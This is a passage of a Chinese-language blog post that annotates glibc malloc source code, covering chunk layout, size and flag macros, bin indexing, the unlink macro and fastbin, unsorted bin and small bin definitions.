class="hljs-comment">/* conversion from malloc headers to user pointers, and back */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span><br><span class="hljs-comment">/* The smallest possible chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span><br><span class="hljs-comment">/* The smallest size we can malloc is an aligned minimal chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MINSIZE  \</span><br><span class="hljs-meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="hljs-comment">/* Check if m has acceptable alignment */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> misaligned_chunk(p) \</span><br><span class="hljs-meta">  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \</span><br><span class="hljs-meta">   &amp; MALLOC_ALIGN_MASK)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Check if a request is so large that it would wrap around zero when</span><br><span class="hljs-comment">   padded and aligned. To simplify some other code, the bound is made</span><br><span class="hljs-comment">   low enough so that adding MINSIZE will also not wrap around zero.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span><br><span class="hljs-meta">  ((unsigned long) (req) &gt;=                                                      \</span><br><span class="hljs-meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span><br><span class="hljs-comment">/* pad request bytes into a usable size -- internal version */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> request2size(req)                                         \</span><br><span class="hljs-meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="hljs-meta">   MINSIZE :                                                      \</span><br><span class="hljs-meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="hljs-comment">/* Same, except also perform an argument and result check.  First, we check</span><br><span class="hljs-comment">   that the padding done by request2size didn&#x27;t result in an integer</span><br><span class="hljs-comment">   overflow.  Then we check (using REQUEST_OUT_OF_RANGE) that the resulting</span><br><span class="hljs-comment">   size isn&#x27;t so large that a later alignment would lead to another integer</span><br><span class="hljs-comment">   overflow.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> checked_request2size(req, sz) \</span><br><span class="hljs-meta">(&#123;                                    \</span><br><span class="hljs-meta">  (sz) = request2size (req);            \</span><br><span class="hljs-meta">  <span class="hljs-meta-keyword">if</span> (((sz) &lt; (req))                    \</span><br><span class="hljs-meta">      || REQUEST_OUT_OF_RANGE (sz)) \</span><br><span class="hljs-meta">    &#123;                                    \</span><br><span class="hljs-meta">      __set_errno (ENOMEM);            \</span><br><span class="hljs-meta">      return 0;                            \</span><br><span class="hljs-meta">    &#125;                                    \</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></div></td></tr></table></figure><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_chunk">malloc_chunk</a></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*  chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">            |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="hljs-comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">            |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="hljs-comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">            |             User data starts here...                          .</span><br><span class="hljs-comment">            .                                                               .</span><br><span class="hljs-comment">            .             (malloc_usable_size() bytes)                      .</span><br><span class="hljs-comment">            .                                                               |</span><br><span class="hljs-comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">            |             (size of chunk, but used for application data)    |</span><br><span class="hljs-comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">            |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="hljs-comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br>  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      mchunk_size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p><strong>MALLOC_ALIGNMENT</strong>在32和64位机上分别为8和16字节, 被定义为<code>2 * SIZE_SZ</code> 和 <code>__alignof__ (long double)</code>中的较大者.<br><strong>MALLOC_ALIGN_MASK</strong>定义为MALLOC_ALIGNMENT - 1, 在64位上是0b1111.<br><strong>MIN_CHUNK_SIZE</strong>是fd_nextsize指针之前的部分.<br><strong>MINSIZE</strong> = <code>(unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</code> 即可完成块大小的16位对齐.</p><p>这样, 在64位系统上MINSIZE就是32(0x20)字节.</p><p><strong>tips</strong>: <code># define INTERNAL_SIZE_T size_t</code>  分别为4或8字节</p><h3 id="chunk-operations"><a href="#chunk-operations" class="headerlink" title="chunk operations"></a><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#1229">chunk operations</a></h3><p>没啥特别的, 如果有需要的话随时查找即可</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PREV_INUSE 0x1</span><br><span class="hljs-comment">/* extract inuse bit of previous chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span><br><span class="hljs-comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_MMAPPED 0x2</span><br><span class="hljs-comment">/* check for mmap()&#x27;ed chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span><br><span class="hljs-comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span><br><span class="hljs-comment">   from a non-main arena.  This is only set immediately before handing</span><br><span class="hljs-comment">   the chunk to the user, if necessary.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NON_MAIN_ARENA 0x4</span><br><span class="hljs-comment">/* Check for chunk from main arena.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span><br><span class="hljs-comment">/* Mark a chunk as not being on the main arena.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Bits to mask off when extracting size</span><br><span class="hljs-comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span><br><span class="hljs-comment">   macros for which mmapped chunks should never be seen. This should</span><br><span class="hljs-comment">   cause helpful core dumps to occur if it is tried by accident by</span><br><span class="hljs-comment">   people extending or adapting this malloc.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span><br><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span><br><span class="hljs-comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><span class="hljs-comment">/* Set the size of the chunk below P.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span><br><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span><br><span class="hljs-comment">/* extract p&#x27;s inuse bit */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse(p)                                                              \</span><br><span class="hljs-meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br><span class="hljs-comment">/* set/clear chunk as being inuse without otherwise disturbing */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_inuse(p)                                                              \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_inuse(p)                                                              \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span><br><span class="hljs-comment">/* check/set/clear inuse bits in known places */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span><br><span class="hljs-comment">/* Set size at head, without disturbing its use bit */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span><br><span class="hljs-comment">/* Set size/use field */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span><br><span class="hljs-comment">/* Set size at footer (only when chunk is not in use) */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span><br></code></pre></div></td></tr></table></figure><h2 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h2><h3 id="在malloc-state中的存储"><a href="#在malloc-state中的存储" class="headerlink" title="在malloc_state中的存储"></a>在malloc_state中的存储</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-comment">/* Fastbins */</span><br>mfastbinptr fastbinsY[NFASTBINS];<br><span class="hljs-comment">/* Normal bins packed as described above */</span><br>mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="bin数组定位-大小"><a href="#bin数组定位-大小" class="headerlink" title="bin数组定位+大小"></a>bin数组定位+大小</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NBINS             128<span class="hljs-comment">//bin链长度</span></span><br><span class="hljs-comment">/* addressing -- note that bin_at(0) does not exist, */</span><span class="hljs-comment">/*Bin 1 is the unordered list*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                              \</span><br><span class="hljs-meta">             - offsetof (struct malloc_chunk, fd))  </span><br><span class="hljs-comment">/* analog of ++bin */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span><br><span class="hljs-comment">/* Reminders about list directionality within bins */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span><br></code></pre></div></td></tr></table></figure><ul><li><p>bin_at的神奇操作: </p><ul><li>对外部而言, bin数组应该为128个, 输入的下标也是如此, 到了内部将其转换为该位置chunk的fd指针, 取地址”&amp;”, 转换为单字节指针char *, 然后减去chunk head的字节数, 变为该chunk的头部, 注意到chunk中只有fd和bk域有意义, 其余部分属于上一个bin头结点.</li><li>除了外部下标到内部下标的转换, <strong>其余步骤相当于mem2chunk()的结果</strong> </li></ul></li><li><p>为什么是<strong>乘以2</strong>呢?</p><p>因为每个bin链在bins数组中存储的是一个fd指针和一个bk指针，即两个malloc chunk指针，所以要NBINS * 2<br>又因为数组bins中索引为0、1的指针是不使用的，所以要减去2</p><blockquote><p>例： bins[2]为unsorted bin链的fd成员，bin[3]为其bk成员, bin[0]为其presize, bin[1]为其size</p></blockquote><img src="../../image/glibc_malloc_srcCode/sbzY4vrhU2wZypm.png" style="zoom: 33%;" /> </li></ul><h3 id="unlink：从bins中取出chunk"><a href="#unlink：从bins中取出chunk" class="headerlink" title="unlink：从bins中取出chunk"></a>unlink：从bins中取出chunk</h3><ul><li>发生在调用free时合并chunk的时候. 被合并的chunk被unlink出来. </li><li>2.25中unlink为宏定义, 2.26为unlink_chunk函数, 仅仅多了一个检查<ul><li><code>if (chunksize (p) != prev_size (next_chunk (p)))  malloc_printerr (&quot;corrupted size vs. prev_size&quot;);</code> </li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list */</span><span class="hljs-comment">//省略了每行末尾的反斜杠</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unlink(AV, P, BK, FD) </span><br>&#123; <span class="hljs-comment">//例子unlink(av, victim, bck, fwd)</span><br>    FD = P-&gt;fd;<span class="hljs-comment">//取出victim的fd和bk指针</span><br>    BK = P-&gt;bk;<br><span class="hljs-comment">//例行检查,实际上就是如果victim没有完整的在链表中的话就报错</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//如果正常的话</span><br>        FD-&gt;bk = BK;<br>        BK-&gt;fd = FD; <span class="hljs-comment">//取出了victim</span><br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (P)) &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) <br>        &#123;<span class="hljs-comment">//如果在largebin里的链表 且 在chunk size链表里则需要额外设置fd_nextsize和bk_nextsize</span><br>            <span class="hljs-comment">//简单的检查, victim是不是 *完整的* 在chunk size链表</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)<br>|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>, P, AV);<br>            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//FD和victim同样大小</span><br>                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)<span class="hljs-comment">//fd_nextsize等于自身只能说明链表里只有这个大小</span><br>                  <span class="hljs-comment">//现在就剩下FD(后面或许还有等大的)了, 修改一下chunk size链表</span><br>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;<br>                <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//链表里还有其他的chunk</span><br>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;<br>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;<br>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;<br>                    P-&gt;bk_nextsize-&gt;fd_nextsi  ze = FD;<br>                  &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//victim是一个单独的chunk</span><br>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;<br>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><p><strong>相关介绍和特点</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Fastbins</span><br><span class="hljs-comment">    An array of lists holding recently freed small chunks.  Fastbins</span><br><span class="hljs-comment">    are not doubly linked.  It is faster to single-link them, and</span><br><span class="hljs-comment">    since chunks are never removed from the middles of these lists,</span><br><span class="hljs-comment">    double linking is not necessary. Also, unlike regular bins, they</span><br><span class="hljs-comment">    are not even processed in FIFO order (they use faster LIFO) since</span><br><span class="hljs-comment">    ordering doesn&#x27;t much matter in the transient contexts in which</span><br><span class="hljs-comment">    fastbins are normally used.</span><br><span class="hljs-comment">    Chunks in fastbins keep their inuse bit set, so they cannot</span><br><span class="hljs-comment">    be consolidated with other free chunks. malloc_consolidate</span><br><span class="hljs-comment">    releases all chunks in fastbins and consolidates them with</span><br><span class="hljs-comment">    other free chunks.</span><br><span class="hljs-comment"> */</span><br>- 使用LIFO, 在链表头执行取出插入操作<br>- PREV_INUSE总为<span class="hljs-number">1</span>, 不会和相邻块进行合并<br>- chunk从不会在链表中间被删去, 只需要单向链表即可<br></code></pre></div></td></tr></table></figure><p><strong>indexing</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mfastbinptr</span>;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span><br><span class="hljs-comment">/* offset 2 to use otherwise unindexable first 2 bins */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin_index(sz) \</span><br><span class="hljs-meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></code></pre></div></td></tr></table></figure><ul><li>从fastbin_index方法也可以看出fastbin是将<strong>chunk大小</strong>转换为<strong>数据空间大小</strong>来index的, 从最短的8字节到80字节(默认64字节), 实际上支持(80 * SIZE_SZ / 4)字节</li></ul><p><strong>数量和容量</strong> </p><p><code>_int_malloc</code>中判断chunk是否在fastbin范围内使用的是<code>get_max_fast()</code>函数, 返回的是<code>global_max_fast</code>变量, 在<code>malloc_init_state()</code>中调用<code>set_max_fast(DEFAULT_MXFAST)</code>初始化为128.</p><p>也就是说fastbin的范围是<strong>0x20-0x80</strong>.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* The maximum fastbin request size we support */</span><br><span class="hljs-comment">//    DEFAULT_MXFAST     64 (for 32bit), 128 (for 64bit)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_max_fast(s) \</span><br><span class="hljs-meta">  global_max_fast = (((s) == 0)                                                      \</span><br><span class="hljs-meta">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()</span><br><span class="hljs-comment">   that triggers automatic consolidation of possibly-surrounding</span><br><span class="hljs-comment">   fastbin chunks. This is a heuristic, so the exact value should not</span><br><span class="hljs-comment">   matter too much. It is defined at half the default trim threshold as a</span><br><span class="hljs-comment">   compromise heuristic to only attempt consolidation if it is likely</span><br><span class="hljs-comment">   to lead to trimming. However, it is not dynamically tunable, since</span><br><span class="hljs-comment">   consolidation reduces fragmentation surrounding large chunks even</span><br><span class="hljs-comment">   if trimming is not used.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>unsorted bin在bin数组中下标为1的位置(0无意义)</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span><br></code></pre></div></td></tr></table></figure><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span 